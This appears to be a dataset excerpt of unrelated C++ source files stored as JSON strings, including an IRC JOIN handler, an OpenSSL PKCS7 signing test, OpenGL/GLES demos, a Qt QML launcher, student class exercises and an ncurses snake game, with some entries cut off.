CopySyntaxTree\nstruct CopySyntaxTree : Transformer\n{\n\tExpression* transformNumber(Number const* number)\n\t{\n\t\tExpression* exp = new Number(number->value());\n\t\treturn exp;\n\t}\n\tExpression* transformBinaryOperation(BinaryOperation const* binop)\n\t{\n\t\tExpression* exp = new BinaryOperation((binop->left())->transform(this), binop->operation(), (binop->right())->transform(this));\n\t\treturn exp;\n\t}\n\tExpression* transformFunctionCall(FunctionCall const* fcall)\n\t{\n\t\tExpression* exp = new ",
    "#include \"../../include/core/Executor.hpp\"\n#include \"../../include/core/Server.hpp\"\n\n// JOIN \ud30c\uc2f1\nvoid Executor::parseJOIN(std::vector<std::string>& cmds, std::string& msg)\n{\n\tstd::stringstream ss(msg);\n\tstd::string cmd;\n\twhile (ss >> cmd)\n\t\tcmds.push_back(cmd);\n}\n\n// JOIN \uc2e4\ud589\nvoid Executor::JOIN(Client& client, std::vector<std::string>& cmds)\n{\n\n\t// \ub9e4\uac1c\ubcc0\uc218\uac00 \ubd80\uc871\ud55c \uacbd\uc6b0\n\tif (cmds.size() < 2)\n\t{\n\t\tclient.addToSendBuf(ServerMsg::NEEDMOREPARAMS(client.getNick(), cmds[0]));\n\t\treturn ;\n\t}\n\n\t// join \uba85\ub839\uc5b4 \ud30c\uc2f1 2\ud0c4!\n\t// 1\ubc88\uc9f8 \uc778\uc790\uc758 ','\ub97c ' '\ub85c \ubcc0\uacbd\n\tfor (int i = 0; i < static_cast<int>(cmds[1].size()); i++)\n\t{\n\t\tif (cmds[1][i] == ',')\n\t\t\tcmds[1][i] = ' ';\n\t}\n\t// \uccab\ubc88\uc9f8\uc778\uc790\ub97c ' '\uae30\uc900\uc73c\ub85c \ub098\ub204\uba74\uc11c \ub098\uba38\uc9c0 \uc778\uc790\ub4e4\uc744 \uc9dd\uc73c\ub85c \ub9de\ucdb0\uc90c\n\tstd::vector<std::pair<std::string, std::string> > cmdPairVector;\n\tstd::stringstream ss(cmds[1]);\n\tint idx = 2;\n\tstd::string str;\n\twhile (ss >> str)\n\t{\n\t\tstd::string pair = \"\";\n\t\tif (idx < static_cast<int>(cmds.size()))\n\t\t\tpair = cmds[idx++];\n\t\tcmdPairVector.push_back(std::make_pair(str, pair));\n\t}\n\n\tfor (int i = 0; i < static_cast<int>(cmdPairVector.size()); i++)\n\t{\n\t\tstd::string room = cmdPairVector[i].first;\n\t\tstd::string param = cmdPairVector[i].second;\n\n\t\t// \uc798\ubabb\ub41c \ucc44\ub110 \uc774\ub984\uc778 \uacbd\uc6b0\n\t\tif (Channel::isInvalidChannelName(room))\n\t\t{\n\t\t\tclient.addToSendBuf(ServerMsg::INVALIDCHANNEL(client.getNick(), room));\n\t\t\tcontinue;\n\t\t}\n\t\t// \uc774\ubbf8 \ucc38\uc5ec\ud55c \ucc44\ub110\uc778 \uacbd\uc6b0\n\t\tif (client.isClientMemberOfChannel(room))\n\t\t{\n\t\t\tcontinue;\n\t\t}\n\n\t\t// \ucc44\ub110\uc5d0 \ucc38\uac00\n\t\tChannel::joinChannel(client, room, param);\n\t}\n}",
    "\ufeff// openssl.cpp: \u5b9a\u4e49\u5e94\u7528\u7a0b\u5e8f\u7684\u5165\u53e3\u70b9\u3002\n//\n\n#include<iostream>\n#include<memory>\n\n#include\"openssl.h\"\n#include\"utils/file_utils.h\"\nusing namespace std;\n\nint test()\n{\n\tstd::cout << \"test\" << std::endl;\n\treturn 0;\n}\nint main()\n{\n\tX509* cert = NULL;\n\tEVP_PKEY* privateKey = NULL;\n\tBIO* memBio = NULL;\n\tPKCS7* p7 = NULL;\n\tint result = 0;\n\tBIO* output = NULL;\n\tchar buf[5] = { 0 };\n\tsize_t readByts = 0;\n\tstd::string ret;\n\n\tstd::string content = \"byebye\"; \n\tcert = readCert(\"/home/xingxing/opensslKeyAndCeritificate/ecdsa_cert.pem\");\n\tif (cert == NULL)return -1;\n\tprivateKey = readPrivateKey(\"/home/xingxing/opensslKeyAndCeritificate/private.key\"); if (privateKey == NULL)return -1;\n\tmemBio = BIO_new_mem_buf(content.data(), content.size()); if (memBio == NULL)return -1;\n\tp7 = PKCS7_sign(cert, privateKey, NULL, memBio, 0); if (p7 == NULL)return -1;\n\tresult=PKCS7_verify(p7, NULL, NULL, NULL, NULL, PKCS7_NOVERIFY);\n\tif (result == 1)\n\t{\n\t\tstd::cout << \"verified success!\" << std::endl;\n\t}\n\telse {\n\t\tstd::cout<<(\"verified failed\") << std::endl;\n\t}\n\toutput=PKCS7_dataDecode(p7, NULL, NULL, NULL);\n\n\twhile ((result = BIO_read_ex(output, buf, sizeof(buf), &readByts))==1)\n\t{\n\t\tret.append(buf,readByts);\n\t}\n\tstd::cout << \"ret size:\" << ret.size() << std::endl;\n\tstd::cout <<\"content:\"<< ret << std::endl;\n\n\t/*size_t written = 0;\n\tint ret=BIO_write(memBio,content.c_str(), content.length());\n\tstd::cout << ret << std::endl;\n\tstd::cout << written << std::endl;\n\tstd::cout << buf << std::endl;*/\n\treturn 0;\n}\n",
    "#if defined(linux)\n// GLES\n#include <GLES/gl.h>\n#include <GLES/glext.h>\n// EGL\n#include <GLES/egl.h>\n// SDL2\n#include <SDL2/SDL.h> // For Events\n#include <SDL2/SDL_syswm.h>\n#endif\n\n#if defined(__WIN32__)\n// GLAD\n#include <glad/glad.h>\n// GLES\n//#include <GLES/gl.h>\n//#include <GLES/glext.h>\n// EGL\n//#include <GLES/egl.h>\n#include <EGL/egl.h>\n// SDL2\n#include <SDL2/SDL.h> // For Events\n#include <SDL2/SDL_syswm.h>\n\n#endif\n\nEGLDisplay glDisplay;\nEGLConfig glConfig;\nEGLContext glContext;\nEGLSurface glSurface;\n\nconst char *gl_vendor, *gl_renderer, *gl_version, *gl_extensions;\n\nSDL_Window *glesWindow = NULL;\n\nfloat mCubeRotation = 0.0f;\n\nfloat vertices[] = {\n        -1.0f, -1.0f, -1.0f,\n        1.0f, -1.0f, -1.0f,\n        1.0f, 1.0f, -1.0f,\n        -1.0f, 1.0f, -1.0f,\n        -1.0f, -1.0f, 1.0f,\n        1.0f, -1.0f, 1.0f,\n        1.0f, 1.0f, 1.0f,\n        -1.0f, 1.0f, 1.0f\n};\n\nfloat colors[] = {\n        0.0f, 1.0f, 0.0f, 1.0f,\n        0.0f, 1.0f, 0.0f, 1.0f,\n        1.0f, 0.5f, 0.0f, 1.0f,\n        1.0f, 0.5f, 0.0f, 1.0f,\n        1.0f, 0.0f, 0.0f, 1.0f,\n        1.0f, 0.0f, 0.0f, 1.0f,\n        0.0f, 0.0f, 1.0f, 1.0f,\n        1.0f, 0.0f, 1.0f, 1.0f\n};\n\nchar indices[] = {\n        0, 4, 5, 0, 5, 1,\n        1, 5, 6, 1, 6, 2,\n        2, 6, 7, 2, 7, 3,\n        3, 7, 4, 3, 4, 0,\n        4, 7, 6, 4, 6, 5,\n        3, 0, 1, 3, 1, 2\n};\n\n\nvoid emulateGLUperspective(GLfloat fovY, GLfloat aspect, GLfloat zNear,\n                           GLfloat zFar) {\n    GLfloat fW, fH;\n    fH = tan(fovY / 180 * M_PI) * zNear / 2;\n    fW = fH * aspect;\n    glFrustumf(-fW, fW, -fH, fH, zNear, zFar);\n}\n\nvoid init_GLES(void) {\n    int screenwidth = 800;\n    int screenheight = 480;\n    int screenbpp = 16;\n    int fullscreen = 0;\n\n    EGLint egl_config_attr[] = {\n            EGL_BUFFER_SIZE, 16,\n            EGL_DEPTH_SIZE, 16,\n            EGL_STENCIL_SIZE, 0,\n            EGL_SURFACE_TYPE,\n            EGL_WINDOW_BIT,\n            EGL_NONE\n    };\n\n    EGLint numConfigs, majorVersion, minorVersion;\n    glesWindow = SDL_CreateWindow(\"GLES_BOX_DEMO\", 0, 0, screenwidth, screenheight,\n                                  fullscreen ? (SDL_WINDOW_OPENGL | SDL_WINDOW_FULLSCREEN) : SDL_WINDOW_OPENGL);\n    glDisplay = eglGetDisplay(EGL_DEFAULT_DISPLAY);\n    eglInitialize(glDisplay, &majorVersion, &minorVersion);\n    eglChooseConfig(glDisplay, egl_config_attr, &glConfig, 1, &numConfigs);\n    SDL_SysWMinfo sysInfo;\n    SDL_VERSION(&sysInfo.version); // Set SDL version\n    SDL_GetWindowWMInfo(glesWindow, &sysInfo);\n    glContext = eglCreateContext(glDisplay, glConfig, EGL_NO_CONTEXT, NULL);\n#if defined(linux)\n    glSurface = eglCreateWindowSurface(glDisplay, glConfig, (EGLNativeWindowType) sysInfo.info.x11.window, 0); // X11\n#elif defined(__WIN32__)\n    glSurface = eglCreateWindowSurface(glDisplay, glConfig, (EGLNativeWindowType) sysInfo.info.win.window, 0); // Win\n#endif\n    eglMakeCurrent(glDisplay, glSurface, glSurface, glContext);\n    eglSwapInterval(glDisplay, 1);\n    glClearColor(0.0f, 0.0f, 0.0f, 0.5f);\n    glClearDepthf(1.0f);\n    glEnable(GL_DEPTH_TEST);\n    glDepthFunc(GL_LEQUAL);\n    glHint(GL_PERSPECTIVE_CORRECTION_HINT, GL_NICEST);\n    glViewport(0, 0, screenwidth, screenheight);\n    glMatrixMode(GL_PROJECTION);\n    glLoadIdentity();\n    emulateGLUperspective(45.0f, (float) screenwidth / (float) screenheight, 0.1f,\n                          100.0f);\n    glViewport(0, 0, screenwidth, screenheight);\n    glMatrixMode(GL_MODELVIEW);\n    glLoadIdentity();\n}\n\nvoid draw_frame() {\n    glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);\n    glLoadIdentity();\n    glTranslatef(0.0f, 0.0f, -10.0f);\n    glRotatef(mCubeRotation, 1.0f, 1.0f, 1.0f);\n    glFrontFace(GL_CW);\n    glVertexPointer(3, GL_FLOAT, 0, vertices);\n    glColorPointer(4, GL_FLOAT, 0, colors);\n    glEnableClientState(GL_VERTEX_ARRAY);\n    glEnableClientState(GL_COLOR_ARRAY);\n    glDrawElements(GL_TRIANGLES, 36, GL_UNSIGNED_BYTE, indices);\n    glDisableClientState(GL_VERTEX_ARRAY);\n    glDisableClientState(GL_COLOR_ARRAY);\n    glLoadIdentity();\n    mCubeRotation -= 0.50f;\n}\n\nint main(int argv, char **args) {\n    int loop = 1;\n    SDL_Event event;\n    init_GLES();\n\n    while (loop) {\n        while (SDL_PollEvent(&event)) {\n            switch (event.type) {\n                case SDL_QUIT: {\n                    loop = 0;\n                    break;\n                }\n            }\n        }\n\n        draw_frame();\n        eglSwapBuffers(glDisplay, glSurface);\n    }\n\n    // Cleaning\n    eglDestroySurface(glDisplay, glSurface);\n    eglDestroyContext(glDisplay, glContext);\n    eglTerminate(glDisplay);\n    SDL_DestroyWindow(glesWindow);\n\n    return 0;\n}",
    "// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"ELMTCombo.h\"\n#include \"CommonTextBlock.h\"\n\nvoid UELMTCombo::SynchronizeProperties() {\n\tSuper::SynchronizeProperties();\n\n\tif (!ComboBoxStyle)\n\t\treturn;\n\n\tTObjectPtr<UELMTComboStyle> StyleInstance = ComboBoxStyle.GetDefaultObject();\n\tFComboBoxStyle EditedStyle = StyleInstance->Style;\n\n\tif (StyleInstance->CommonButtonStyle) {\n\t\tTObjectPtr<UCommonButtonStyle> ButtonInstance = StyleInstance->CommonButtonStyle.GetDefaultObject();\n\n\t\tEditedStyle.ComboButtonStyle.ButtonStyle.SetNormal(ButtonInstance->NormalBase);\n\t\tEditedStyle.ComboButtonStyle.ButtonStyle.SetPressed(ButtonInstance->NormalPressed);\n\t\tEditedStyle.ComboButtonStyle.ButtonStyle.SetHovered(ButtonInstance->NormalHovered);\n\t\tEditedStyle.ComboButtonStyle.ButtonStyle.SetDisabled(ButtonInstance->Disabled);\n\n\t\tif (ButtonInstance->GetNormalTextStyle()) {\n\t\t\tFont = ButtonInstance->GetNormalTextStyle()->Font;\n\t\t\tForegroundColor = ButtonInstance->GetNormalTextStyle()->Color;\n\t\t}\n\t}\n\n\tSetWidgetStyle(EditedStyle);\n\tSetItemStyle(StyleInstance->ItemStyle);\n\tScrollBarStyle = StyleInstance->ScrollBarStyle;\n}\n",
    "#include <iostream>\r\nusing namespace std;\r\n#include <string>\r\n#include<vector>\r\n\r\n// Idea is Creating a family tree using a single linked list from head to bottom\r\n\r\nclass Person{\r\n    public: //must specify otherwise default private\r\n    string _name;\r\n    vector<Person*> _children={}; //list of pointers not objects so if one object changes the change is reflected when accessing the pointer instead of ending up with 2 different objects in memory originating from 1 object change.\r\n\r\n    Person(string name){_name=name;}\r\n\r\n    void NullPtrCheck(){\r\n        if (this == nullptr){\r\n            cout<<\"Error: Cannot perform action on Nullptr\\n\";\r\n            return;\r\n        }\r\n    }\r\n\r\n    #pragma region adders\r\n    void addChild(Person* p){\r\n        NullPtrCheck();\r\n        // if (this == nullptr)\r\n        //     cout<<\"Error: Cannot add child to Nullptr\\n\";\r\n        // else\r\n            _children.push_back(p);\r\n        }\r\n\r\n    void addChild(string name){\r\n        // if (this == nullptr)\r\n        //     cout<<\"Error: Cannot add child to Nullptr\\n\";\r\n        // else{\r\n        NullPtrCheck();\r\n        Person* p = new Person(name);\r\n        _children.push_back(p);\r\n        // }\r\n    }\r\n    #pragma endregion\r\n\r\n    #pragma region Printers\r\n    void PrintChildren(){ //this could also be outside of Class in the form of PrintChildren(Person* p) since no private var access needed\r\n        cout<<\"Children of \"<<this->returnName()<<\": \";\r\n        \r\n        //print first child, seperated from loop just for the sake of output format not ending with a \",\"\r\n        if (_children.size()>=1)\r\n            cout<<_children[0]->returnName();\r\n\r\n        for (int i = 1; i < _children.size(); i++)\r\n        {\r\n            cout<<\", \";\r\n            cout<<_children[i]->returnName();\r\n        }\r\n        cout<<\"\\n\";\r\n    }\r\n    #pragma endregion\r\n\r\n    #pragma region getters\r\n    string returnName(){ //NOTE: SINCE CAN BE nullptr, CANNOT JUST PRINT this->name\r\n        if (this != nullptr) {\r\n            return this->_name;\r\n        } else {\r\n            return \"NAN\";\r\n        }\r\n    }\r\n\r\n    vector<Person*> returnChildren(){ //NOTE: SINCE CAN BE nullptr, CANNOT JUST USE this->_children\r\n        if (this != nullptr) {\r\n            return this->_children;\r\n        } else {\r\n            return {};\r\n        }\r\n    }\r\n\r\n    Person* getChild(string name){ //BFS same as isChild, just return object instead of bool\r\n        for (Person* p : this->returnChildren()){\r\n            if (p->returnName() == name)\r\n                return p;\r\n        }\r\n        return nullptr;\r\n    }\r\n\r\n    // Person* getNthChild(string name){ //BFS or DFS to see if a person if part of the parent's lineage\r\n    //     while (this->returnChildren() != {}){\r\n\r\n    //     }\r\n    //     return nullptr;\r\n    // }\r\n\r\n    // Person* getParent(Person* head){ //get Parent of specific entity. Need to start from head since it's single linked list\r\n    //     if (this == head) //cannot be parent if you are yourself the root. If you're not the root then you must be someone's child\r\n    //         return nullptr;\r\n\r\n    //     Person* p = head;\r\n    //     while (p->returnChildren()!={})\r\n    //     {\r\n    //         if(p->isChild(this->returnName())) //if i am the child of the current entity, then this entity is my parent\r\n    //             return p;\r\n    //     }\r\n    // }\r\n    #pragma endregion\r\n\r\n    #pragma region checkers\r\n    bool isChild(string name){ //O(n). BFS :) same as getChild, just return bool instead of object\r\n        for (Person* p : this->returnChildren()){\r\n            if (p->returnName() == name)\r\n                return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n    bool isGrandChild(string name){//use isChild. DFS, O(n^2)\r\n        for (Person* p : this->returnChildren()){ //for every child of this entity\r\n            if (p->isChild(name)) //check if input is a child of the child iterated\r\n                return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n    // bool isNthChild(string name, int n){ //DFS recursion of isChild\r\n    //     return false;\r\n    // } \r\n    #pragma endregion\r\n};\r\n\r\n#pragma region global functions\r\n//no need for it to be in Class (part of object) since no private var access needed. If in Class, it would be in the same format as PrintChildren\r\nvoid PrintTree(Person* head){ //BFS, should use PrintChildren\r\n    cout<<head->returnName()<<\": \";\r\n    // Person *p = head;\r\n    // While p.children is not empty{\r\n    //     cout<<p->name<<\", \";\r\n    // }\r\n    cout<<\"\\n\";\r\n}\r\n\r\nPerson* getPerson(Person* head, string name){ //BFS or DFS to see if a person is part of tree\r\n        if (head->returnName() ==name)\r\n            return head;\r\n\r\n        // while (this->returnChildren() != {}){\r\n\r\n        // }\r\n        return nullptr;\r\n    }\r\n\r\nbool Exists(Person *head, string name){\r\n    if (getPerson(head, name) ==nullptr)\r\n        return false;\r\n    return true;\r\n}\r\n#pragma endregion\r\n\r\nint main(){\r\n    //creating family tree ahmad->ali->edy\r\n ",
    "#include <iostream>\n#include <cctype>\nusing namespace std;\n\nclass Pen\n{\npublic:\n    string model;\n    string color;\n    float tip;\n    int charge;\n    bool covered;\n\n    void scribble()\n    {\n        if (covered == true)\n        {\n            cout << \"[ERROR] A caneta esta tampada!\" << endl;\n        }\n        else\n        {\n            charge -= 1;\n            cout << \"A caneta rabiscou e agora a caneta tem \"<< charge <<\" % da carga!\" << endl;\n        }\n    }\n\n    void cover()\n    {\n        if (covered == true)\n        {\n            cout << \"[ERROR] A caneta ja esta tampada!\" << endl;\n        }\n        else\n        {\n            cout << \"A caneta foi tampada!\" << endl;\n            covered = true;\n        }\n    }\n\n    void uncover()\n    {\n        if (covered == true)\n        {\n            cout << \"A caneta foi destampada!\" << endl;\n            covered = false;\n        }\n        else\n        {\n            cout << \"[ERROR] A caneta nao esta tampada!\" << endl;\n        }\n    }\n};\n\nstring toLowerCase(const string &str)\n{\n    string lowerStr = str;\n    for (int i = 0; i < lowerStr.length(); ++i)\n    {\n        if (lowerStr[i] >= 'A' && lowerStr[i] <= 'Z')\n        {\n            lowerStr[i] += ('a' - 'A');\n        }\n    }\n    return lowerStr;\n}\n\nint main()\n{\n    Pen pen1;\n    cout << \"Qual e o modelo da caneta: \";\n    getline(cin, pen1.model);\n    cout << \"Qual e a cor da caneta: \";\n    getline(cin, pen1.color);\n    cout << \"Qual e o tamanho da ponta: \";\n    cin >> pen1.tip;\n    cout << \"Qual e a percentagem da carga: \";\n    cin >> pen1.charge;\n    if (pen1.charge < 0 || pen1.charge > 100)\n    {\n        cout << \"[ERROR] valor incorreto. Verifique sua resposta e tente de novo.\";\n        return 0;\n    }\n    \n    string response;\n    cout << \"A caneta esta tampada (Y/N): \";\n    cin >> response;\n\n    if (toLowerCase(response) == \"y\")\n    {\n        pen1.covered = true;\n        response = \"esta\";\n    }\n    else if (toLowerCase(response) == \"n\")\n    {\n        pen1.covered = false;\n        response = \"nao esta\";\n    }\n    else\n    {\n        cout << \"[ERROR] A resposta esta incorreta. Verifique sua resposta e tente de novo.\" << endl;\n        return 0;\n    }\n    \n    cout << \"A sua caneta e do modelo \" << pen1.model << \", a cor da sua caneta e \" << pen1.color << \", o tamanho da ponta e \" << pen1.tip << \", a carga da caneta esta a \" << pen1.charge << \"% e a caneta \" << response << \" tampada.\" << endl;\n\n    cout << \"Deseja fazer mais alguma coisa (Y/N): \";\n    cin >> response;\n\n    if (toLowerCase(response) == \"y\")\n    {\n        while (toLowerCase(response) == \"y\")\n        {\n            cout << \"O que deseja fazer(rabiscar, tampar ou destampar):\";\n            cin >> response;\n            if (toLowerCase(response) == \"rabiscar\")\n            {\n                pen1.scribble();\n            }\n            else if (toLowerCase(response) == \"tampar\")\n            {\n                pen1.cover();\n            }\n            else if (toLowerCase(response) == \"destampar\")\n            {\n                pen1.uncover();\n            }\n            else\n            {\n                cout << \"[ERROR] A resposta esta incorreta. Verifique sua resposta e tente de novo.\" << endl;\n                return 0;\n            }\n\n            cout << \"Deseja fazer mais alguma coisa (Y/N): \";\n            cin >> response;\n\n            if (toLowerCase(response) == \"y\")\n            {\n                \n            }\n            else if (toLowerCase(response) == \"n\")\n            {\n                return 0;\n            }\n            else\n            {\n                cout << \"[ERROR] A resposta esta incorreta. Tente de novo.\" << endl;\n                return 0;\n            }\n            \n        }\n    }\n    else if (toLowerCase(response) == \"n\")\n    {\n        return 0;\n    }\n    else\n    {\n        cout << \"[ERROR] A resposta esta incorreta. Tente de novo.\" << endl;\n        return 0;\n    }\n}\n",
    "#include <QCommandLineOption>\n#include <QCommandLineParser>\n#include <QCoreApplication>\n\n#include <QGuiApplication>\n#include <QNetworkAccessManager>\n#include <QNetworkDiskCache>\n#include <QQmlApplicationEngine>\n#include <QQmlComponent>\n#include <QQmlNetworkAccessManagerFactory>\n#include <QQuickWindow>\n#include <QRegularExpression>\n#include <cstdlib>\n#include <limits>\n\nconst auto FILE_DIRECTORY_AND_NAME_REG_EXP =\n    QRegularExpression(\"(.*)/([^/]+?)(?:[.]qml)?$\");\n\nclass DiskNetworkAccessManagerFactory : public QQmlNetworkAccessManagerFactory {\npublic:\n  QNetworkAccessManager *create(QObject *parent) override;\n};\n\nQNetworkAccessManager *\nDiskNetworkAccessManagerFactory::create(QObject *parent) {\n  auto *networkAccessManager = new QNetworkAccessManager(parent);\n  auto *cache = new QNetworkDiskCache(parent);\n  cache->setMaximumCacheSize(std::numeric_limits<qint64>::max());\n  cache->setCacheDirectory(QString(std::getenv(\"HOME\")) + // NOLINT\n                           \"/.cache/qti/web/\");\n  networkAccessManager->setCache(cache);\n  return networkAccessManager;\n}\n\nint main(int argc, char **argv) {\n  const auto app = QGuiApplication(argc, argv);\n\n  auto cliParser = QCommandLineParser();\n  const auto pathOption =\n      QCommandLineOption(\"path\", \"Path to the root file in a QML app.\", \"path\");\n  const auto daemonOption = QCommandLineOption(\n      \"daemon\", \"When true, do not quit even if there are no windows open.\");\n  cliParser.addHelpOption();\n  cliParser.addVersionOption();\n  cliParser.addOption(pathOption);\n  cliParser.addOption(daemonOption);\n  cliParser.process(app);\n  cliParser.unknownOptionNames();\n\n  const auto path = cliParser.value(pathOption);\n  auto appDirectory = QString();\n  auto appName = QString(\"qti\");\n  auto match = QRegularExpressionMatch();\n  if (path.contains(FILE_DIRECTORY_AND_NAME_REG_EXP, &match)) {\n    appDirectory = match.captured(1);\n    appName = match.captured(2);\n  }\n  QGuiApplication::setDesktopFileName(appName);\n  QGuiApplication::setApplicationName(appName);\n  QGuiApplication::setApplicationDisplayName(appName);\n\n  // TODO: configurable default theme name\n  QIcon::setThemeName(\"qti-dark\");\n  auto themeSearchPaths = QIcon::themeSearchPaths();\n  themeSearchPaths.emplace_back(appDirectory + \"/icons\");\n  QIcon::setThemeSearchPaths(themeSearchPaths);\n\n  auto engine = QQmlApplicationEngine();\n  auto *networkAccessManagerFactory = new DiskNetworkAccessManagerFactory();\n  engine.setNetworkAccessManagerFactory(networkAccessManagerFactory);\n  engine.networkAccessManager();\n  engine.load(path);\n  QQuickWindow::setDefaultAlphaBuffer(true);\n  if (cliParser.isSet(daemonOption)) {\n    QGuiApplication::setQuitOnLastWindowClosed(false);\n  }\n  return QGuiApplication::exec();\n}\n",
    "// Libraries used\n#include <cstdlib>\n#include <iostream>\n#include <ncurses.h>\n#include <time.h>\n#include <unistd.h>\n#include <vector>\nusing namespace std;\n\n// Tools facilits\n#define initSize 1\n#define berry '#'\n#define head '@'\n#define body 'o'\n#define background ' '\n#define wall 'X'\n#define mapSize 30\n#define jMapSize mapSize * 2\nint iBeforeCoord = -1;\nint jBeforeCoord = -1;\nchar direction = 'p';\nint delay = 110000;\n\n// Functions\n\n// Useless in this mode\nvoid display(char map[][jMapSize]) {\n  for (int i = 0; i < mapSize; i++) {\n    for (int j = 0; j < mapSize; j++) {\n      cout << map[i][j] << background;\n    }\n    cout << \"\\n\";\n  }\n}\n\nvoid score(int points) {\n\n  points = (points - initSize) * 10;\n  move(mapSize, 0);\n  printw(\"Score: %d\", points);\n  move(mapSize + 1, 0);\n}\n\n// Condition of Game Over\nbool gameOver(vector<pair<int, int>> nextPosition, char map[][jMapSize]) {\n  if (map[nextPosition[0].first][nextPosition[0].second] == wall ||\n      map[nextPosition[0].first][nextPosition[0].second] == body)\n    return 1;\n  else\n    return 0;\n}\n\n// Moviments control\nvoid move(vector<pair<int, int>> &nextPosition, int i) {\n  char key;\n  key = getch();\n\n  switch (key) {\n  case 's':\n    if (direction != 'w')\n      direction = 's';\n    break;\n  case 'w':\n    if (direction != 's')\n      direction = 'w';\n    break;\n  case 'a':\n    if (direction != 'd')\n      direction = 'a';\n    break;\n  case 'd':\n    if (direction != 'a')\n      direction = 'd';\n    break;\n  }\n\n  switch (direction) {\n  case 's':\n    nextPosition[i].first++;\n    break;\n  case 'w':\n    nextPosition[i].first--;\n    break;\n  case 'a':\n    nextPosition[i].second--;\n    break;\n  case 'd':\n    nextPosition[i].second++;\n    break;\n  }\n}\n\nvoid makeBerry(char map[][jMapSize], int &ibefore, int &jbefore) {\n  int i = rand();\n  int j = rand();\n\n  i = i % mapSize;\n  j = j % jMapSize;\n\n  if (map[i][j] == body || map[i][j] == head || i <= 0 || j <= 0 ||\n      i == (mapSize - 1) || j == (jMapSize - 1) || i == ibefore ||\n      j == jbefore) {\n\n    makeBerry(map, ibefore, jbefore);\n\n  } else {\n    ibefore = i;\n    jbefore = j;\n\n    map[i][j] = berry;\n\n    mvprintw(i, j, \"%c\", berry);\n  }\n}\n\nvoid snake(char map[][jMapSize], int parte, int &size,\n           vector<pair<int, int>> &beforePosition,\n           vector<pair<int, int>> &Position,\n           vector<pair<int, int>> &nextPosition) {\n\n  // Creating a new body if eat a berry\n  if (Position.size() < size) {\n    Position.resize(size);\n    beforePosition.resize(size);\n    nextPosition.resize(size);\n  }\n\n  // Coordenadas da parte posterior indo para a anterior\n  if (parte > 0 && parte < size) {\n    nextPosition[parte].first = Position[parte - 1].first;\n    nextPosition[parte].second = Position[parte - 1].second;\n\n    Position[parte].first = beforePosition[parte - 1].first;\n    Position[parte].second = beforePosition[parte - 1].second;\n  }\n\n  // Head's moviment\n  if (parte == 0) {\n    move(nextPosition, parte);\n  }\n\n  map[Position[parte].first][Position[parte].second] = background;\n  mvprintw(Position[parte].first, Position[parte].second, \"%c\", background);\n\n  if (parte >= 0 && parte < size - 1) {\n    snake(map, parte + 1, size, beforePosition, Position, nextPosition);\n  }\n\n  beforePosition[parte].first = Position[parte].first;\n  beforePosition[parte].second = Position[parte].second;\n\n  Position[parte].first = nextPosition[parte].first;\n  Position[parte].second = nextPosition[parte].second;\n\n  if (parte == 0) {\n    // Condi\u00e7\u00f5es: Check conditions before put head in next place\n    // Berrys\n    if (map[nextPosition[parte].first][nextPosition[parte].second] == berry) {\n      makeBerry(map, iBeforeCoord, jBeforeCoord);\n      size++;\n    }\n    // Game over\n    if (gameOver(nextPosition, map)) {\n      mvprintw(nextPosition[parte].first, nextPosition[parte].second, \"%c\",\n               head);\n\n      mvprintw(mapSize / 2, (jMapSize / 3) - 1, \"Game Over!!!\");\n      refresh();\n      while (getch() != '\\n')\n        ;\n\n      endwin();\n      exit(0);\n    }\n\n    map[nextPosition[parte].first][nextPosition[parte].second] = head;\n\n    mvprintw(nextPosition[parte].first, nextPosition[parte].second, \"%c\", head);\n\n  } else {\n    map[nextPosition[parte].first][nextPosition[parte].second] = body;\n\n    mvprintw(nextPosition[parte].first, nextPosition[parte].second, \"%c\", body);\n  }\n}\n\nvoid initCoord(int &i, int &j) {\n  i = rand() % mapSize;\n  j = rand() % jMapSize;\n\n  if (i == 0 || i == (mapSize - 1) || j == 0 || j == (jMapSize - 1))\n    initCoord(i, j);\n}\n\nint main() {\n  srand(time(NULL));\n\n  // Setting coordinates\n  int initI, initJ;\n  initCoord(initI, initJ);\n\n  // Parts of snake\n  vector<pair<int, int>> Position = {{initI, initJ}};\n  vector<pair<int, int>> nextPosition = {{initI, initJ}};\n  vector<pair<int, int>> beforePosition = {{initI, initJ}};\n\n  // Setting map's and snake's initial size\n  char map[mapSize][jMapSize];\n  int size = initSize;\n  initscr();\n  raw();\n  noecho();\n  scrollok(stdscr, TRUE);\n\n  // Setting map\n  for (int i = ",
    "#include <GL/gl.h>\n#include <GL/glu.h>\n#include <GL/freeglut.h>\n#include <stdio.h>\n#include <math.h>\n#include <glm/glm.hpp>\n#include <glm/gtc/type_ptr.hpp>\n#include <iostream>\n\n#include \"rotation.hpp\"\n\n#define WIDTH 500\n#define HEIGHT 500\n\nfloat zoom = 2.1;\nglm::vec4 \n    target = { 0.0, 0.0, 0.0, 0.0 },\n    rotation = { M_PI/4, 0.0, 0.0, 0.0 };\n\nvoid draw()\n{\n    glm::mat4 *rmatrix = get_rotation_matrix(rotation);\n    glm::vec4 eye = (target - glm::vec4(0.0, zoom, 0.0, 0.0)) * *rmatrix;\n    glm::vec4 up = (target - glm::vec4(0.0, zoom, 1.0, 0.0)) * *rmatrix;\n\n    glPushMatrix();\n\n    glEnable(GL_DEPTH_TEST);\n    glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);\n    \n    gluLookAt(eye.x, eye.y, eye.z,\n              target.x, target.y, target.z,\n              up.x, up.y, up.z);\n\n    glBegin(GL_QUADS);\n        glColor3f(0.0, 0.0, 0.0);\n        glVertex3f(-1.0, -1.0, 0.0);\n        glVertex3f(1.0, -1.0, 0.0);\n        glVertex3f(1.0, 1.0, 0.0);\n        glVertex3f(-1.0, 1.0, 0.0);\n    glEnd();\n\n    glPopMatrix();\n    \n    glutSwapBuffers();\n\n    delete rmatrix;\n}\n\nvoid mouse_wheel_CB(int button, int dir, int x, int y)\n{\n    printf(\"%f\\n\", zoom);\n    zoom += -0.1 * (float)dir;\n    glutPostRedisplay();\n}\n\nvoid resize(GLsizei width, GLsizei height)\n{\n    glViewport(0, 0, (GLint)width, (GLint)height);\n    glMatrixMode(GL_PROJECTION);\n    glLoadIdentity();\n    gluPerspective(70.0, (float) width / height, 0.1, 30.0);\n    glMatrixMode(GL_MODELVIEW);\n}\n\nvoid init(int *argc, char *argv[])\n{\n    glutInit(argc, argv);\n    glutInitDisplayMode(GLUT_SINGLE | GLUT_RGB); \n    